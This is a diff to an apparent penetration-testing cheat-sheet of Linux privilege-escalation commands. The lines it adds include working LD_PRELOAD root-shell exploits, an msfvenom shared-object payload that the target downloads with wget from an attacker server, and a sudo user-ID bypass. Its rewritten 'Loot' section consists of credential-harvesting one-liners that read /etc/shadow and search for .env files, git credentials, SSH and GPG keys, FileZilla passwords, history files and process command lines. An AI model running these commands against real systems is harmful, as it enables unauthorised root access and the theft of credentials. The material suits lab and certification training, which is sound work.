@@ -58,10 +58,16 @@ Sudo:sudo -l # List sudo permissions. Look for NOPASSWD entries and exploitable 
 Sudo:sudo -l | grep -i "env_keep.*LD_PRELOAD" # Check if LD_PRELOAD preserved in sudo; target-machine
 Sudo:sudo <command> # Run command with sudo if allowed; target-machine
 Sudo version 1.8.27: sudo -u#-1 /bin/bash #sudo bypass; target-machine
+Sudo LD_PRELOAD:https://medium.com/@hemparekh1596/ld-preload-and-dynamic-library-hijacking-in-linux-237943abb8e0
 Sudo LD_PRELOAD # 1:gcc -shared -fPIC -o /tmp/lib.so shell.c -nostartfiles && sudo LD_PRELOAD=/tmp/lib.so <sudo_allowed_command> # LD_PRELOAD exploit; target-machine
 Sudo LD_PRELOAD # 2:sudo -l | grep env_keep.*LD_PRELOAD # Check if LD_PRELOAD is preserved in sudo; target-machine
 Sudo LD_PRELOAD # 2:gcc -shared -fPIC -o /tmp/lib.so -x c - <<< $'# include <stdio.h>\n# include <sys/types.h>\n# include <stdlib.h>\nvoid _init() { unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/bash"); }' && sudo LD_PRELOAD=/tmp/lib.so <sudo_allowed_command> # Compile and run LD_PRELOAD exploit in one line; target-machine
-Sudo LD_PRELOAD:https://medium.com/@hemparekh1596/ld-preload-and-dynamic-library-hijacking-in-linux-237943abb8e0
+Sudo LD_PRELOAD # 2:printf '%s\n' '#include <stdio.h>' '#include <sys/types.h>' '#include <stdlib.h>' 'void _init(){unsetenv("LD_PRELOAD");setgid(0);setuid(0);system("/bin/bash");}' > /tmp/lib.c && gcc -shared -fPIC -o /tmp/lib.so /tmp/lib.c -nostartfiles && sudo LD_PRELOAD=/tmp/lib.so <sudo_allowed_command> #compile LD_PRELOAD shared-object payload using /bin/sh-compatible syntax and trigger it through sudo-allowed command when LD_PRELOAD is preserved; target-machine
+Sudo LD_PRELOAD # 3:msfvenom -p linux/x64/exec CMD=/bin/sh -f elf-so -o <filename1>.so #generate Linux x64 shared-object payload that executes /bin/sh for LD_PRELOAD, library hijacking, or shared-object privesc paths; kali-machine
+Sudo LD_PRELOAD # 3:pythonFS <port> # open http listener; kali-machine
+Sudo LD_PRELOAD # 3:cd /tmp #move to writable temp directory before downloading shared-object payload; target-machine
+Sudo LD_PRELOAD # 3:wget http://<kali>:<kaliPort>/<filename1>.so -O /tmp/<filename1>.so #download malicious shared-object payload from attacker HTTP server; target-machine
+Sudo LD_PRELOAD # 3:sudo LD_PRELOAD=/tmp/<filename1>.so <sudo_allowed_command> #trigger LD_PRELOAD privesc through sudo-allowed binary when sudo preserves LD_PRELOAD; target-machine
 Cron:cat /etc/crontab # View system crontab. Look for jobs running as root; target-machine
 Cron:ls -la /etc/cron.d/ # Check cron.d directory; target-machine
 Cron:ls -la /etc/cron.daily/ # Check daily cron jobs; target-machine
@@ -118,34 +124,17 @@ Tmux/Screen:ps aux | grep tmux # Look for tmux sessions; target-machine
 Tmux/Screen:ps aux | grep screen # Look for screen sessions; target-machine
 Tmux Hijack:tmux attach -t <session> # Attach to tmux session if permissions allow; target-machine
 Screen Hijack:screen -x <user>/<session> # Attach to screen session; target-machine
-Loot:grep -RInE 'password\s*=|passwd\s*=|pwd\s*=|secret\s*=|token\s*=|api[_-]?key\s*=|connectionstring|PRIVATE KEY' /home /opt /var/www /srv /etc 2>/dev/null #search common app and user paths for low-noise credential and token patterns; target-machine
-Loot:grep -rli "password\|pass\|pwd\|cred" /home/ 2>/dev/null # Search home directories for credentials; target-machine
-Loot:grep -rli "password\|pass\|pwd\|cred" /etc/ 2>/dev/null # Search etc for credentials; target-machine
-Loot:grep -rli "password\|pass\|pwd\|cred" /var/www/ 2>/dev/null # Search web root for credentials; target-machine
-Loot:find / -name ".bash_history" -exec grep -i "pass\|ssh\|mysql\|psql" {} \; 2>/dev/null # Search history files; target-machine
-Loot:find / -name ".git-credentials" -exec cat {} \; 2>/dev/null # Find git credentials; target-machine
-Loot:find / -name ".env" -exec cat {} \; 2>/dev/null # Find environment variable files; target-machine
-Loot:find / -name "wp-config.php" -exec grep -i "DB_USER\|DB_PASSWORD" {} \; 2>/dev/null # Find WordPress configs; target-machine
-Loot:find / -name "config.php" -exec grep -i "password\|pass\|user" {} \; 2>/dev/null # Find PHP configs; target-machine
-Loot:strings /var/log/* 2>/dev/null | grep -i "password\|pass\|cred" # Search logs for credentials; target-machine
-Loot:grep -RHi -n -C 2 "pass\|pwd\|key\|secret\|cred" / 2>/dev/null | sed 200q | while read l; do echo "[!] $l"; done # Hunt credentials across filesystem; target-machine
-Loot:find / -type f -name "*:*" 2>/dev/null | sed 200q # Find files with ADS-like names; target-machine
-Loot:find / -type f -size -5k -exec grep -qi "proof\|flag\|password" {} \; -print 2>/dev/null | sed 200q # Grep small files for flags; target-machine
-Loot:grep -RHi "proof\|local.txt\|flag\|pass\|cred" / 2>/dev/null | sed 300q # Recursive cred/flag grep; target-machine
-Loot:for f in $(ls /proc 2>/dev/null); do [ -f /proc/$f/cmdline ] && echo "[PROC:$f]$(tr -d '\0' < /proc/$f/cmdline)" | grep -qi "root"; done 2>/dev/null | sed 200q # Spot root processes; target-machine
-Loot:strings /var/log/* 2>/dev/null | grep -i "pass\|token\|cred\|proof" | sed 200q # Scrape logs for secrets; target-machine
-Loot:for d in /home/*; do echo "[HOME]$d"; find $d -maxdepth 4 -type f -exec grep -qi "proof\|flag\|password\|kdbx" {} \; -print 2>/dev/null; done # Hunt in home directories; target-machine
-Loot:for d in /home/*; do echo "[HOME]$d"; find $d -maxdepth 4 -type f -exec grep -qi 'proof|flag|password|kdbx' {} ; -print 2>/dev/null | sed 100q; done # Home hunt with output cap; target-machine
-Loot:ls -laR /opt 2>/dev/null | grep -i "backup\|cred\|flag\|proof" | sed 200q # Check /opt for backups; target-machine
-Loot:find / -name "*.bak" -o -name "*.old" -o -name "*.backup" -o -name "*.conf" -o -name "*.kdbx" -o -name "*.key" 2>/dev/null | sed 200q # Find backup/config files; target-machine
-Loot:find / \( -name "*.bak" -o -name "*.old" -o -name "*.backup" -o -name "*.conf" -o -name "*.kdbx" -o -name "*.key" -o -name "*.key" \) 2>/dev/null | sed 200q # Find sensitive artifacts; target-machine
-Loot:cat /etc/shadow # Read shadow file if readable; target-machine
-Loot:cat /etc/passwd # Read passwd file; target-machine
-Loot:find / -name shadow -readable 2>/dev/null -exec cat {} \; # Find readable shadow files; target-machine
-Loot:find / -name "*.bak" -o -name "*.old" -o -name "*.backup" 2>/dev/null # Find backup files; target-machine
-Loot:find / -name "id_rsa*" -o -name "*.pem" 2>/dev/null # Find SSH private keys; target-machine
-Loot:find /home -name "*.gpg" -o -name "*.asc" 2>/dev/null # Find GPG keys; target-machine
-Loot:find /home -name ".netrc" -exec cat {} \; 2>/dev/null # Find .netrc files with credentials; target-machine
+Loot:find /home /root -type f \( -path '*/.filezilla/sitemanager.xml' -o -path '*/.filezilla/recentservers.xml' -o -path '*/.config/filezilla/sitemanager.xml' -o -path '*/.config/filezilla/recentservers.xml' \) -readable -print -exec grep -HnE '[<](Host|Port|User|Pass|Name)[>]' {} \; 2>/dev/null #find FileZilla saved/recent server configs and extract stored FTP hosts, usernames, passwords, and profile names without unsupported XML-tag placeholders; target-machine
+Loot:find /home /root /opt /var/www /srv /etc -type f \( -name '.env' -o -name '.git-credentials' -o -name '.netrc' -o -name 'wp-config.php' -o -name 'config.php' -o -name '*.conf' -o -name '*.ini' -o -name '*.xml' -o -name '*.json' -o -name '*.yml' -o -name '*.yaml' -o -name '*.bak' -o -name '*.old' -o -name '*.backup' -o -name '*.kdbx' -o -name 'id_rsa*' -o -name '*.pem' -o -name '*.key' -o -name '*.gpg' -o -name '*.asc' \) -readable -print 2>/dev/null | sed 300q #find common credential-bearing files, backups, configs, KeePass databases, SSH keys, private keys, and GPG/ASCII-armored files in high-value Linux paths; target-machine
+Loot:find /home /root -type d -name '.gnupg' -print 2>/dev/null #locate GnuPG keyring directories that may contain private keys, trustdb, and saved encryption/signing material; target-machine
+Loot:for d in /home /root /opt /var/www /srv /etc; do [ -d "$d" ] && grep -RInIE 'password\s*=|passwd\s*=|pwd\s*=|secret\s*=|token\s*=|api[_-]?key\s*=|connectionstring|DB_USER|DB_PASSWORD|PRIVATE KEY' "$d" 2>/dev/null; done | sed 300q #search high-value Linux paths for low-noise credential, token, connection string, and private-key patterns; target-machine
+Loot:find /home /root -type f \( -name '.*history' -o -name '*history.txt' -o -name '.mysql_history' -o -name '.psql_history' \) -readable -exec grep -HnEi 'pass|pwd|ssh|mysql|psql|ftp|token|key|cred' {} \; 2>/dev/null | sed 200q #search shell and application history files for leaked credentials, database commands, SSH usage, and tokens; target-machine
+Loot:find /var/log -maxdepth 2 -type f -readable -exec grep -aHnEi 'pass|passwd|pwd|token|secret|cred|key|proof|flag' {} + 2>/dev/null | sed 200q #search readable logs for leaked secrets, credentials, tokens, and flag/proof references; target-machine
+Loot:cat /etc/passwd 2>/dev/null; [ -r /etc/shadow ] && cat /etc/shadow; find /etc /var/backups /home /root -type f \( -name shadow -o -name passwd -o -name '*shadow*' \) -readable -print 2>/dev/null | sed 100q #read passwd/shadow if accessible and locate readable shadow/passwd backups in common paths; target-machine
+Loot:find /home /root /opt /var/www /srv -type f -size -10k -readable -exec grep -Iq . {} \; -exec grep -HnEi 'proof|local\.txt|flag|password|cred|token' {} \; 2>/dev/null | sed 300q #search small readable text files for flags, proof files, credentials, and tokens in high-value paths; target-machine
+Loot:for p in /proc/[0-9]*/cmdline; do [ -r "$p" ] && cmd=$(tr '\0' ' ' < "$p"); echo "$cmd" | grep -Eiq 'pass|pwd|token|secret|key|mysql|psql|ftp|ssh' && echo "[$p] $cmd"; done 2>/dev/null | sed 200q #search process command lines for exposed credentials, tokens, keys, and database/SSH command usage; target-machine
+Loot:find /home /root /opt /var/www /srv -maxdepth 5 \( -iname '*backup*' -o -iname '*cred*' -o -iname '*flag*' -o -iname '*proof*' \) -print 2>/dev/null | sed 200q #find backup, credential, flag, and proof-related files or directories by name in high-value paths; target-machine
+Loot:find /home /root /opt /var/www /srv -type f -name '*:*' -print 2>/dev/null | sed 200q #find colon-named files that may indicate ADS-like challenge artifacts or unusual hidden loot naming; target-machine
 Inotify:ps aux | grep inotify # Find processes monitoring file changes; target-machine
 Inotify:inotifywait -m /path/to/watch # Manually monitor directory for changes; target-machine
 Python Hijacking:python3 -c "import sys; print(sys.path)" # Show Python module search path; target-machine
